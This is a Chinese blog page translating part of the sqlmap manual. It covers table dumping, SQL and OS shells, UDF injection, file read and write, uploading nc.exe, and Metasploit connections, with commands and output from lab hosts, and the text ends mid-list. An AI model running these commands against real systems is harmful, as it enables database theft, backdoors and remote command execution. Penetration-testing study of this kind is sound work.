@@ -1,0 +1,1337 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8">
+<title>Sqlmap命令行（其三） - 锅哥的日常</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+
+
+    <meta name="description" content="0x0D 列举数据库管理系统的模式参数：–schema和–exclude-sysdbs用户可用此选项列举数据库管理系统的模式。模式列表包含所有数据库、表、列、触发器和他们各自的类型。同样地，可使用参数“–exclude-sysdbs”排除系统数据库。 下面是的例子测试对象是Mysql:部分输出如下：">
+<meta name="keywords" content="工具手册">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sqlmap命令行（其三）">
+<meta property="og:url" content="http:&#x2F;&#x2F;www.f4guo.top&#x2F;2019&#x2F;05&#x2F;13&#x2F;Sqlmap%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%88%E5%85%B6%E4%B8%89%EF%BC%89&#x2F;index.html">
+<meta property="og:site_name" content="锅哥的日常">
+<meta property="og:description" content="0x0D 列举数据库管理系统的模式参数：–schema和–exclude-sysdbs用户可用此选项列举数据库管理系统的模式。模式列表包含所有数据库、表、列、触发器和他们各自的类型。同样地，可使用参数“–exclude-sysdbs”排除系统数据库。 下面是的例子测试对象是Mysql:部分输出如下：">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-05-18T03:58:20.519Z">
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+<link rel="icon" href="/images/favicon.ico">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+    
+    
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.ico" alt="Sqlmap命令行（其三）" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+                <a class="navbar-item"
+                href="/about">关于</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;" target="_blank" rel="noopener">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-05-13T08:26:07.000Z">2019-05-13</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    1 小时 读完 (大约 10338 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                Sqlmap命令行（其三）
+            
+        </h1>
+        <div class="content">
+            <blockquote>
+<p><font color="#87CEFF" size="2"> </font></p>
+</blockquote>
+<h3 id="0x0D-列举数据库管理系统的模式"><a href="#0x0D-列举数据库管理系统的模式" class="headerlink" title="0x0D 列举数据库管理系统的模式"></a>0x0D 列举数据库管理系统的模式</h3><p><strong>参数：–schema和–exclude-sysdbs</strong><br>用户可用此选项列举数据库管理系统的模式。模式列表包含所有数据库、表、列、触发器和他们各自的类型。<br>同样地，可使用参数“–exclude-sysdbs”排除系统数据库。</p>
+<p>下面是的例子测试对象是Mysql:<br>部分输出如下：</p>
+<a id="more"></a>
+<figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">Database: mysql</span><br><span class="line">Table: procs_priv</span><br><span class="line">[8 columns]</span><br><span class="line">+<span class="hljs-comment">--------------+----------------------------------------+</span></span><br><span class="line">| Column       | Type                                   |</span><br><span class="line">+<span class="hljs-comment">--------------+----------------------------------------+</span></span><br><span class="line">| Timestamp    | timestamp                              |</span><br><span class="line">| User         | char(16)                               |</span><br><span class="line">| Db           | char(64)                               |</span><br><span class="line">| Grantor      | char(77)                               |</span><br><span class="line">| Host         | char(60)                               |</span><br><span class="line">| Proc_priv    | <span class="hljs-keyword">set</span>(<span class="hljs-string">'Execute'</span>,<span class="hljs-string">'Alter Routine'</span>,<span class="hljs-string">'Grant'</span>) |</span><br><span class="line">| Routine_name | <span class="hljs-built_in">char</span>(<span class="hljs-number">64</span>)                               |</span><br><span class="line">| Routine_type | enum(<span class="hljs-string">'FUNCTION'</span>,<span class="hljs-string">'PROCEDURE'</span>)           |</span><br><span class="line">+<span class="hljs-comment">--------------+----------------------------------------+</span></span><br><span class="line">[...]</span><br><span class="line"><span class="hljs-keyword">Database</span>: mysql</span><br><span class="line"><span class="hljs-keyword">Table</span>: ndb_binlog_index</span><br><span class="line">[<span class="hljs-number">7</span> <span class="hljs-keyword">columns</span>]</span><br><span class="line">+<span class="hljs-comment">-----------+---------------------+</span></span><br><span class="line">| <span class="hljs-keyword">Column</span>    | <span class="hljs-keyword">Type</span>                |</span><br><span class="line">+<span class="hljs-comment">-----------+---------------------+</span></span><br><span class="line">| <span class="hljs-keyword">Position</span>  | <span class="hljs-built_in">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">unsigned</span> |</span><br><span class="line">| deletes   | <span class="hljs-built_in">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">unsigned</span> |</span><br><span class="line">| epoch     | <span class="hljs-built_in">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">unsigned</span> |</span><br><span class="line">| <span class="hljs-keyword">File</span>      | <span class="hljs-built_in">varchar</span>(<span class="hljs-number">255</span>)        |</span><br><span class="line">| inserts   | <span class="hljs-built_in">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">unsigned</span> |</span><br><span class="line">| schemaops | <span class="hljs-built_in">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">unsigned</span> |</span><br><span class="line">| updates   | <span class="hljs-built_in">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">unsigned</span> |</span><br><span class="line">+<span class="hljs-comment">-----------+---------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p><strong><em>1.列举表中数据条数</em></strong><br><strong>参数：–count</strong><br>有时我们只想知道有多少数据而不想知道具体的数据内容，此时就可以使用该参数。如：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"</span> --count -D testdb</span><br></pre></td></tr></table></figure>
+<p>部分输出如下：</p>
+<figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Database: testdb</span><br><span class="line">+<span class="hljs-comment">----------------+---------+</span></span><br><span class="line">| Table          | Entries |</span><br><span class="line">+<span class="hljs-comment">----------------+---------+</span></span><br><span class="line">| dbo.users      | 4       |</span><br><span class="line">| dbo.users_blob | 2       |</span><br><span class="line">+<span class="hljs-comment">----------------+---------+</span></span><br></pre></td></tr></table></figure>
+<p><strong><em>2.列举表中数据</em></strong><br><strong>参数：–dump、-C、-T、-D、–start、–stop和–where</strong><br>权限允许时可以列举表中数据。用参数“-D”指定数据库，用参数“-T”指定数据表，用参数“-C”指定目标列。<br>若只指定了数据表而没有指定数据库则默认使用当前数据库。若没有指定列则列举表中全部列。<br>下例是以Firebird为目标：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/firebird/get_int.php?id=1"</span> --dump -T users</span><br></pre></td></tr></table></figure>
+<p>部分输出如下：</p>
+<figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: Firebird_masterdb</span><br><span class="line">Table: USERS</span><br><span class="line">[4 entries]</span><br><span class="line">+<span class="hljs-comment">----+--------+------------+</span></span><br><span class="line">| ID | NAME   | SURNAME    |</span><br><span class="line">+<span class="hljs-comment">----+--------+------------+</span></span><br><span class="line">| 1 | luther | blisset     |</span><br><span class="line">| 2 | fluffy | bunny       |</span><br><span class="line">| 3 | wu     | ming        |</span><br><span class="line">| 4 | NULL   | nameisnull  |</span><br><span class="line">+<span class="hljs-comment">---+--------+-------------+</span></span><br></pre></td></tr></table></figure>
+<p>只使用参数“–dump”和“-D”可以一次性列举整个数据库中所有数据。</p>
+<p>Sqlmap会自动将参数“–dump”列举的数据保存到CSV格式文件中，文件具体路径会在Sqlmap的输出中给出，如：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1"</span> -D DSSchool --dump</span><br></pre></td></tr></table></figure>
+<p>部分输出为：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[11:15:27] [INFO] analyzing table dump <span class="hljs-keyword">for</span> possible password hashes</span><br><span class="line">Database: DSSchool</span><br><span class="line">Table: T_SCORESYSTEMTEACHERS</span><br><span class="line">[2 entries]</span><br><span class="line">+-----+----------+-------+---------+----------+</span><br><span class="line">| AGE | NAME     | TITLE | ACCOUNT | PASSWORD |</span><br><span class="line">+-----+----------+-------+---------+----------+</span><br><span class="line">| 21  | neo      | ??    | 001     | 001      |</span><br><span class="line">| 31  | morphine | ??    | 002     | 002      |</span><br><span class="line">+-----+----------+-------+---------+----------+</span><br><span class="line">     </span><br><span class="line">[11:15:27] [INFO] table <span class="hljs-string">'DSSchool.T_SCORESYSTEMTEACHERS'</span> dumped to CSV file <span class="hljs-string">'/home/werner/.sqlmap/output/192.168.56.102/dump/DSSchool/T_SCORESYSTEMTEACHERS.csv'</span></span><br></pre></td></tr></table></figure>
+<p>截取的输出中最后一行便是CSV文件保存的路径。</p>
+<p>若只想列举部分数据可以使用参数“–start”和“–stop”。如只想列举第一条数据可以添加“–stop 1”，<br>只想列举第二和第三条数据可以添加“–start 1 –stop 3”，可见这是一个左开右闭区间。<br>区间范围仅在盲注中有效，因为在基于错误信息的注入和联合查询注入中区间范围会被忽略。</p>
+<p>除了用区间范围限制列举的数据外，还可以用“–where”参数来限制列举的数据。<br>“–where”参数会被Sqlmap转换成WHERE子句，如“–where id&gt;3”会只列举列id的值大于3的数据。</p>
+<p>如你所见，Sqlmap十分灵活。可以囫囵地列举整个数据库，也可以细致地在表中选择列，在列中又选择特定数据。<br><strong><em>3.列举所有数据库所有表中所有数据</em></strong><br><strong>参数：–dump-all和–exclude-sysdbs</strong><br>使用参数“–dump-all”可列举所有数据库所有表中所有数据。同样地，可使用参数“–exclude-sysdbs”排除系统数据库。</p>
+<p>注意微软SQL Server的master数据库不属于系统数据库，因为有些管理员会在这个数据库中存储用户数据。<br><strong><em>4.在数据库、表、列中搜索</em></strong><br><strong>参数：–search、-C、-T和-D</strong><br>可以搜索数据库名，在所有数据库中搜索表名，在所有数据库的所有表中搜索列名。<br>参数“–search”要和下列参数之一配合使用：</p>
+<pre><code>-C：后跟以逗号分隔的列名，在整个数据库管理系统中搜索
+-T：后跟以逗号分隔的表名，在整个数据库管理系统中搜索
+-D：后跟以逗号分隔的库名，在整个数据库管理系统中搜索</code></pre><p>在搜索时，Sqlmap会询问用户进行精确搜索还是包含搜索。<br>默认为包含搜索，即搜索的字符串包含于结果中就认为命中。<br>精确搜索要求搜索的字符串与结果完全相等。<br><strong><em>5.运行自定义的SQL语句</em></strong><br><strong>参数：–sql-query和–sql-shell</strong><br>这一功能允许执行任意的SQL语句，Sqlmap会自动解析给出的SQL语句，选择恰当的注入技术并将给出的SQL语句打包到payload中。</p>
+<p>如果查询是个SELECT语句，Sqlmap会返回查询结果。如果Web应用使用的数据库管理系统支持多语句查询，Sqlmap会使用堆注入技术。<br>但要注意Web应用可能不支持堆查询，例如PHP使用Mysql时不支持堆查询，但使用PostgreSQL时支持堆查询。</p>
+<p>下例的目标是SQL Server 2000：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1"</span> --sql-query <span class="hljs-string">"SELECT 'foo'"</span> -v 1</span><br></pre></td></tr></table></figure>
+<p>部分输出如下：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hh:mm:14] [INFO] fetching SQL SELECT query output: <span class="hljs-string">'SELECT '</span>foo<span class="hljs-string">''</span></span><br><span class="line">[hh:mm:14] [INFO] retrieved: foo</span><br><span class="line">SELECT <span class="hljs-string">'foo'</span>:</span><br><span class="line"><span class="hljs-string">'foo'</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1"</span> --sql-query <span class="hljs-string">"SELECT 'foo', 'bar'"</span> -v <span class="hljs-number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>部分输出如下：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hh:mm:50] [INFO] fetching SQL SELECT query output: <span class="hljs-string">'SELECT '</span>foo<span class="hljs-string">', '</span>bar<span class="hljs-string">''</span></span><br><span class="line">[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now</span><br><span class="line">unpack it into distinct queries to be able to retrieve the output even <span class="hljs-keyword">if</span> we are</span><br><span class="line">going blind</span><br><span class="line">[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS</span><br><span class="line">VARCHAR(8000)), (CHAR(32)))</span><br><span class="line">[hh:mm:50] [INFO] retrieved: foo</span><br><span class="line">[hh:mm:50] [DEBUG] performed 27 queries <span class="hljs-keyword">in</span> 0 seconds</span><br><span class="line">[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VA</span><br><span class="line">RCHAR(8000)), (CHAR(32)))</span><br><span class="line">[hh:mm:50] [INFO] retrieved: bar</span><br><span class="line">[hh:mm:50] [DEBUG] performed 27 quer</span><br></pre></td></tr></table></figure>
+<p>如你所见，Sqlmap将提供的SQL语句分成了两个不同的SELECT语句，并分别返回结果。</p>
+<p>参数“–sql-shell”提供一个交互式的SQL语句执行环境，支持Tab键补全和命令历史记录。如：</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.102/user.php?id=1"</span> --sql-shell</span><br></pre></td></tr></table></figure>
+<p>部分输出如下：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[15:06:47] [INFO] calling MySQL shell. To quit <span class="hljs-built_in">type</span> <span class="hljs-string">'x'</span> or <span class="hljs-string">'q'</span> and press ENTER</span><br><span class="line">sql-shell&gt; select <span class="hljs-string">'foo'</span>;</span><br><span class="line">[15:07:41] [INFO] fetching SQL SELECT statement query output: <span class="hljs-string">'select '</span>foo<span class="hljs-string">''</span></span><br><span class="line">select <span class="hljs-string">'foo'</span>;:    <span class="hljs-string">'foo'</span></span><br><span class="line">sql-shell&gt; select password from mysql.user <span class="hljs-built_in">where</span> user=<span class="hljs-string">'root'</span>;</span><br><span class="line">[15:07:42] [INFO] fetching SQL SELECT statement query output: <span class="hljs-string">'select password from mysql.user where user='</span>root<span class="hljs-string">''</span></span><br><span class="line">select password from mysql.user <span class="hljs-built_in">where</span> user=<span class="hljs-string">'root'</span>; [1]:</span><br><span class="line">[*] *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">sql-shell&gt; show tables;</span><br><span class="line">[15:11:15] [INFO] fetching SQL SELECT statement query output: <span class="hljs-string">'show tables'</span></span><br><span class="line">[15:11:15] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)</span><br><span class="line">show tables; [1]:</span><br></pre></td></tr></table></figure>
+<h3 id="0x0E-UDF注入"><a href="#0x0E-UDF注入" class="headerlink" title="0x0E UDF注入"></a>0x0E UDF注入</h3><p><strong>参数：–udf-inject</strong><br>UDF是“user-defined function”的缩写，UDF是一种针对MySQL和PostgreSQL的高级注入技术，详情见《Advanced SQL injection to operating system full control》。</p>
+<p>可以编译MySQL或PostgreSQL的共享库、DLL（Windows）和共享对象（Linux/Unix）并将这些文件在本机上的路径提供给Sqlmap来进行UDF注入。<br>Sqlmap会先问一些问题然后上传UDF文件并创建UDF最后根据问题答案执行UDF。完成UDF注入后，Sqlmap会删除上传的UDF文件。</p>
+<p><strong>参数：–shared-lib</strong><br>添加此参数Sqlmap会在运行时询问共享库文件路径。</p>
+<p>在Sqlmap安装目录的udf目录中有许多UDF文件，按照DMBS、操作系统、位数和版本归类，可以直接使用。</p>
+<h3 id="0X0F-访问文件系统"><a href="#0X0F-访问文件系统" class="headerlink" title="0X0F 访问文件系统"></a>0X0F 访问文件系统</h3><p><strong><em>1.读取文件</em></strong><br><strong>参数：–file-read</strong><br>当数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有读取文件相关权限时读取文件是可行的。<br>读取的文件既可以是文件文件也可以是二进制文件，Sqlmap会处理好的。下例的目标数据库管理系统是SQL Server 2005：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther"</span> --file-read <span class="hljs-string">"C:/example.exe"</span> -v 1</span><br></pre></td></tr></table></figure>
+<p>部分输出如下：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="line">web server operating system: Windows 2000</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2005</span><br><span class="line">[hh:mm:50] [INFO] fetching file: <span class="hljs-string">'C:/example.exe'</span></span><br><span class="line">[hh:mm:50] [INFO] the SQL query provided returns 3 entries</span><br><span class="line">C:/example.exe file saved to:</span><br><span class="line"><span class="hljs-string">'/software/sqlmap/output/192.168.136.129/files/C__example.exe'</span></span><br></pre></td></tr></table></figure>
+<p>然后查看下载的文件：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l output/192.168.136.129/files/C__example.exe</span><br><span class="line">-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe</span><br><span class="line">$ file output/192.168.136.129/files/C__example.exe</span><br><span class="line">output/192.168.136.129/files/C__example.exe: PE32 executable <span class="hljs-keyword">for</span> MS Windows (GUI) Intel 80386 32-bit</span><br></pre></td></tr></table></figure>
+<p><strong><em>2.上传文件</em></strong><br><strong>参数：–file-write和–file-dest</strong><br>当数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有写文件相关权限时上传文件是可行的。<br>上传的文件既可以是文件文件也可以是二进制文件，Sqlmap会处理好的。下例的目标数据库管理系统是MySQL，上传了一个二进制的UPX压缩文件：</p>
+<pre><code>$ file /software/nc.exe.packed
+/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit
+$ ls -l /software/nc.exe.packed
+-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed
+$ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot; -\
+-file-write &quot;/software/nc.exe.packed&quot; --file-dest &quot;C:/WINDOWS/Temp/nc.exe&quot; -v 1
+[...]
+[hh:mm:29] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows 2003 or 2008
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
+back-end DBMS: MySQL &gt;= 5.0.0
+[...]
+do you want confirmation that the file &apos;C:/WINDOWS/Temp/nc.exe&apos; has been success
+fully written on the back-end DBMS file system? [Y/n] y
+[hh:mm:52] [INFO] retrieved: 31744
+[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 b
+ytes, same size as the local file &apos;/software/nc.exe.packed&apos;</code></pre><h3 id="0x10-操作系统控制"><a href="#0x10-操作系统控制" class="headerlink" title="0x10 操作系统控制"></a>0x10 操作系统控制</h3><p><strong><em>1.执行任意操作系统命令</em></strong><br><strong>参数：–os-cmd和–os-shell</strong><br>若数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有相关权限Sqlmap就能利用SQL注入执行任意的操作系统命令。</p>
+<p>当数据库管理系统是MySQL或PostgreSQL时，Sqlmap会通过前面介绍过的文件上传功能上传一个包含用户自定义函数sys_exec()和sys_eval()的二进制共享库文件，然后创建这两个用户自定义函数，通过这两个函数之一来执行用户指定的命令。选择哪个函数取决于用户是否想要显示命令执行的标准输出。</p>
+<p>当数据库管理系统是微软的SQL Server时，Sqlmap通过存储过程xp_cmdshell来执行任意命令。<br>若xp_cmdshell被禁用（SQL Server &gt;= 2005时默认禁用）Sqlmap会启用它；<br>若xp_cmdshell不存在，Sqlmap会创建它。</p>
+<p>当用户想要看到命令执行的标准输出时，Sqlmap使用可列举的注入技术（盲注、带内和基于错误的注入），而当用户不想看到命令执行的标准输出时，堆查询注入技术将被用于执行命令。</p>
+<p>下例的目标是PostgreSQL：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1"</span> --os-cmd id -v 1</span><br></pre></td></tr></table></figure>
+<p>部分输出如下所示：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">web application technology: PHP 5.2.6, Apache 2.2.9</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[hh:mm:12] [INFO] the back-end DBMS operating system is Linux</span><br><span class="line">[hh:mm:12] [INFO] testing <span class="hljs-keyword">if</span> current user is DBA</span><br><span class="line">[hh:mm:12] [INFO] detecting back-end DBMS version from its banner</span><br><span class="line">[hh:mm:12] [INFO] checking <span class="hljs-keyword">if</span> UDF <span class="hljs-string">'sys_eval'</span> already exist</span><br><span class="line">[hh:mm:12] [INFO] checking <span class="hljs-keyword">if</span> UDF <span class="hljs-string">'sys_exec'</span> already exist</span><br><span class="line">[hh:mm:12] [INFO] creating UDF <span class="hljs-string">'sys_eval'</span> from the binary UDF file</span><br><span class="line">[hh:mm:12] [INFO] creating UDF <span class="hljs-string">'sys_exec'</span> from the binary UDF file</span><br><span class="line"><span class="hljs-keyword">do</span> you want to retrieve the <span class="hljs-built_in">command</span> standard output? [Y/n/a] y</span><br><span class="line"><span class="hljs-built_in">command</span> standard output:</span><br><span class="line"><span class="hljs-string">'uid=104(postgres) gid=106(postgres) groups=106(postgres)'</span></span><br><span class="line">[hh:mm:19] [INFO] cleaning up the database management system</span><br><span class="line"><span class="hljs-keyword">do</span> you want to remove UDF <span class="hljs-string">'sys_eval'</span>? [Y/n] y</span><br><span class="line"><span class="hljs-keyword">do</span> you want to remove UDF <span class="hljs-string">'sys_exec'</span>? [Y/n] y</span><br><span class="line">[hh:mm:23] [INFO] database management system cleanup finished</span><br><span class="line">[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can only be deleted manually</span><br></pre></td></tr></table></figure>
+
+<p>使用参数“–os-shell”可以模拟一个可以执行任意命令的shell，和“–sql-shell”一样这个shell也可以用Tab键补全，支持历史记录。</p>
+<p>当堆查询不被支持（如PHP或ASP+Mysql）且数据库管理系统是MySQL时，仍然可以通过SELECT的从句INTO OUTFILE在Web所在主机的可写目录创建一个Web后门，通过这个Web后门来执行命令。Sqlmap支持这一技术并要求用户提供一些用逗号分割的可能是可写目录的路径。Sqlmap支持以下这些服务器端脚本语言：</p>
+<pre><code>ASP
+ASP.NET
+JSP
+PHP</code></pre><p><strong><em>2.带外TCP连接：Meterpreter及相关</em></strong><br><strong>参数：–os-pwn、–os-smbrelay、–os-bof、–priv-esc、–msf-path和–tmp-path</strong><br>若数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有相关权限Sqlmap就有可能在攻击者的主机和数据库所在主机之间建立带外TCP连接。根据用户的选择，此连接可以是交互式命令shell，Meterpreter会话或图形用户界面（VNC）会话。</p>
+<p>Sqlmap要靠Metasploit生成shellcode，在数据库所在主机执行shellcode有以下四种技术：</p>
+<pre><code>数据库通过Sqlmap创建的用户自定义函数sys_bineval()在内存中执行Metasploit的shellcode。支持MySQL和PostgreSQL。参数“–os-pwn”。
+通过Sqlmap自己的用户自定义函数（MySQL和PostgreSQL中的sys_exec()，微软SQL Server中的xp_cmdshell()）上传并执行Metasploit的“stand-alone payload stager”。参数：“–os-pwn”。
